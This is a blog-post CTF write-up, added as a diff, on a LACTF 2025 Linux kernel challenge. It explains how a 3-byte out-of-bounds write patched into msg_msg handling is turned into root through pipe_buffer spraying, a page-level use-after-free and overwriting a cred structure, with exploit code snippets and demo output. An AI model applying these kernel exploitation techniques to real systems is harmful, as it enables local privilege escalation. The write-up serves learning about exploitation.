@@ -1,0 +1,238 @@
+---
+title: "From OOB Write to Root: Exploiting 3-Byte Overflow in LACTF 2025"
+description: Exploiting a 3 byte OOB write to root in a Linux kernel pwnable from LACTF 2025
+author: Shunt
+tags: ["pwn"]
+pubDate: '2025-02-12'
+---
+
+import {Image} from 'astro:assets';
+import TemporaryAlert from "../../../components/TemporaryAlert.astro"
+
+import Figure1 from './figure_1.svg';
+import Figure2 from './figure_2.svg';
+import Figure3 from './figure_3.svg';
+import Figure4 from './figure_4.svg';
+
+<TemporaryAlert client:load />
+
+This is a writeup for the Linux kernel pwnable challenge I solved last weekend in LACTF.
+
+# messenger
+*Description:*
+> i love sending messages, so i made it possible to add just a few more bytes to them
+> 
+> `nc chall.lac.tf 31174`
+> 
+
+This is a Linux kernel exploitation challenge, but unlike generic kernel challenges, there was no custom kernel module implemented; instead, the author patched the bug into kernel code.
+
+The challenge distribution contains kernel image, patch file, qemu run script, a Dockerfile and make files. I didn't notice while solving the challenge but they also provided the kernel config. Common protection techniques like SMAP, SMEP, and KPTI were enabled.
+
+## Patch Analysis
+The patch:
+```diff
+--- a/ipc/msgutil.c
++++ b/ipc/msgutil.c
+@@ -93,7 +93,7 @@
+ 		return ERR_PTR(-ENOMEM);
+ 
+ 	alen = min(len, DATALEN_MSG);
+-	if (copy_from_user(msg + 1, src, alen))
++	if (copy_from_user(msg + 1, src, alen + 3))
+ 		goto out_err;
+ 
+ 	for (seg = msg->next; seg != NULL; seg = seg->next) {
+
+```
+
+As you can see from the patch, the author introduced a 3-bytes out-of-bound write bug into the IPC message handling, where 3 extra bytes from the user buffer is copied to `msg`.
+
+The patch is made in `load_msg` function, which copies `len` number of bytes from a user pointer `src` to the `struct msg_msg`  data buffer.
+```c (10-15)
+struct msg_msg *load_msg(const void __user *src, size_t len)
+{
+	struct msg_msg *msg;
+	struct msg_msgseg *seg;
+	int err = -EFAULT;
+	size_t alen;
+
+	msg = alloc_msg(len);
+	if (msg == NULL)
+		return ERR_PTR(-ENOMEM);
+
+	alen = min(len, DATALEN_MSG);
+	if (copy_from_user(msg + 1, src, alen + 3))
+		goto out_err;
+
+	// ...
+
+	return msg;
+
+out_err:
+	free_msg(msg);
+	return ERR_PTR(err);
+}
+```
+
+`load_msg` is called in `do_msgsnd` function, which is used to enqueue a message to a message queue. And `do_msgsnd` can be called using the `msgsnd` system call.
+```c
+static long do_msgsnd(int msqid, long mtype, void __user *mtext,
+		size_t msgsz, int msgflg)
+{
+	struct msg_queue *msq;
+	struct msg_msg *msg;
+	int err;
+	
+	// ...
+
+	msg = load_msg(mtext, msgsz);
+	if (IS_ERR(msg))
+		return PTR_ERR(msg);
+
+	msg->m_type = mtype;
+	msg->m_ts = msgsz;
+
+	// ...
+	
+	return err;
+}
+```
+
+Now we know the bug can be triggered using the `msgsnd` system call and we can access these IPC syscalls because `CONFIG_SYSVIPC` is enabled. This bug in `load_msg` lets us OOB write into any slab cache of sizes ranging from 64B to 4KB. Note that since `msg_msg` is allocated with `GFP_KERNEL_ACCOUNT` flag, the structure will be placed in `kmalloc-cg-*` slab caches.
+## Page Use-After-Free
+I wanted to try out the technique discussed in the [PageJack](https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf) presentation so I chose [`pipe_buffer`](https://elixir.bootlin.com/linux/v6.10.9/source/include/linux/pipe_fs_i.h#L26) as my target FSKO structure to OOB into. Both `msg_msg` and `pipe_buffer` are elastic structures which is allocated with the `GFP_KERNEL_ACCOUNT` flag, so both can be fit into the same kmalloc cache.
+
+```c
+struct pipe_buffer {
+	struct page *page;
+	unsigned int offset, len;
+	const struct pipe_buf_operations *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+```
+
+First, to ensure our `msg_msg` is placed right before our target `pipe_buffer` object, spray a large amount of `pipe_buffer` objects and release a few in the middle. Recapture the freed `pipe_buffer` slots with `msg_msg` and use the OOB write to overwrite exactly 1 byte of the first quad-word of `pipe_buffer`, i.e., `struct page` pointer. I overwrote the Least Significant Byte of `struct page*` with `0x40`, as `struct page` pointer's LSB always end with a multiple of `0x40` because of its size.
+
+<Image src={Figure1} alt="Figure 1" />
+
+```c
+printf("[+] Spraying pipe_buffer\n");
+spray_pipes(PIPE_SPRAY_CNT);
+mark_pipes(PIPE_SPRAY_CNT);
+
+printf("[+] Freeing buffer prev to target\n");
+free_special_pipes(from, to);
+
+printf("[+] Allocating target msg_msg\n");
+msg_t* msg = malloc(sizeof(msg_t) + MSGSZ + OVERFLOWSZ);
+msg->mtype = 0x1337;
+
+size_t msg_sz = MSGSZ-0x30-2;
+memset(msg->mtext, 0x41, msg_sz);
+msg->mtext[msg_sz+2] = 0x40;
+for (int i = 0; i < QID_CNT; i++) 
+qids[i] = SAFE(msgget(IPC_PRIVATE, 0666 | IPC_CREAT));
+
+for (int i = 0; i < QID_CNT; i++)
+SAFE(msgsnd(qids[i], msg, msg_sz, 0)); // overflow a byte
+
+printf("[+] OOB success\n");
+```
+If we successfully fill the hole correctly, two pipes should now point to the same physical memory page. We can then identify the overlapping page by simply reading the marked unique value off the pipe. If a duplicate value has been found that means the the duplicate pipe has been found. If the read value does not match the marked unique integer, that pipe is the overlapping target pipe.
+
+<Image src={Figure2} alt="Figure 2"/>
+
+```c
+for (int i = 0; i < PIPE_SPRAY_CNT; i++) {
+  if ((from <= i) && (i <= to) && (i % 0x10 == 0)) continue;
+
+  int num = -1;
+
+  SAFE(read(pipes[i][0], &num, sizeof(int)));
+
+  if ((i != num) && (i != 0)) {
+    memcpy(&overlapped[0], &pipes[num], sizeof((int[]){0, 0}));
+    memcpy(&overlapped[1], &pipes[i], sizeof((int[]){0, 0}));
+
+    goto found_overlap;
+  }
+}
+
+printf("[-] Failed to overlap page\n");
+exit(-1);
+
+found_overlap:
+printf("[+] Found overlapped pipe_buffer\n");
+```
+
+Now that we've found the overlapped pipes, we can release one of the pipes, hence the page goes back to page allocator. But we still got the reference to the page in another pipe. 
+
+<Image src={Figure3} alt="Figure 3" tooltip="hello" />
+
+```c
+printf("[+] Freeing a page\n");
+close(overlapped[1][0]);
+close(overlapped[1][1]);
+```
+We've just acquired a page level UAF, this is really powerful because now we can reallocate the page with any target struct we want and we'll be able to arbitrarily read or write to that structure.
+## Privilege Escalation
+As mentioned in the PageJack presentation, I chose `struct file` as the initial target. Since we can just modify the FSKO field `file->f_mode` of a read-only file and make it writable. But `/etc` folder is not present in the challenge instance. Why? idk, but it was likely intended to prevent privilege escalation by overwriting `/etc/passwd`, which I was about to do. Then I thought I could overwrite the busybox binary with shellcode, and I got shellcode execution in busybox, only to notice busybox is NOT a setuid binary. OMG I should have paid closer attention to it.
+
+After reading this [writeup](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html), I chose to attack `struct cred` instead. Cred is used to manage a process's privileges, i.e., it stores the process's UID, GID, capabilities, and more. We can just write some zeros to first half of the struct to escalate the process's privileges. You can easily allocate a `cred` structure by creating a new process using `fork` system call.
+
+But creating a new process creates a lot of noise where some other caches might occupy our freed page, which will affect the stability of our exploit, when I tried I was not even able occupy the page with cred once. At the end of that writeup the author mentioned something interesting:
+> The exploit relied on `setuid`, which triggers `prepare_creds` and allocates cred objects to prepopulate `cred_jar` slabs. This way, the exploit can trigger allocations of such pages without much noise and then fork to retake them.
+
+Unlike generic objects which are stored in `kmalloc` slab, `cred` is stored in an isolated `cred_jar` slab and when needed `prepare_creds` function is used to allocate a set of cred from it. The trick here is before some other kernel feature devouring our UAF page, we devour it ourselves using `setuid` or some other `set*` syscalls. Repeatedly calling setuid will drain the `cred_jar` cache, so kernel will re-fill the cache by getting pages from the page allocator without much noise as fork would.
+
+<Image src={Figure4} alt="Figure 4"/>
+
+I followed this method and sprayed `cred` structure with `setuid` syscall and then allocated a cred in the UAF page using fork, then kept checking uid of the child processes to see if any of them became root, if a process was root it will print the flag and give us a root shell.
+
+While the pid check is running, write some zeros to the pipe which will overwrite the ID fields of the forked process's `cred` structure.
+```c
+printf("[+] Spray cred_jar\n");
+for (int i = 0; i < 0x50; i++) {
+	setuid(1000);
+}
+
+printf("[+] Re-Capturing cred_jar\n");
+if (!fork()) {
+	fork_n_win(0x100); // gives us root shell if pid == 0
+}
+
+// increase sleep time if it doesn't work
+usleep(100000);
+
+static char buffer[PAGESZ] = {0};
+write(overlapped[0][1], &buffer, 0x18+4); // overwrites cred struct id's
+```
+
+Demo:
+```
+/tmp $ ./exploit
+FD limit set to 4096
+[+] Spraying pipe_buffer
+[+] Freeing buffer prev to target
+[+] Allocating target msg_msg
+[+] OOB success
+[+] Found overlapped pipe_buffer
+[+] Freeing a page
+[+] Spray cred_jar
+[+] Re-Capturing cred_jar
+uid: 0
+gid: 0
+euid: 0
+egid: 0
+pid: 139
+lactf{msg_msg_my_beloved}
+```
+
+### Epilogue
+Thanks for reading, I hope you learnt something new from this post and I hope to write more post from this year.
+
+References:
+- https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf
+- https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html
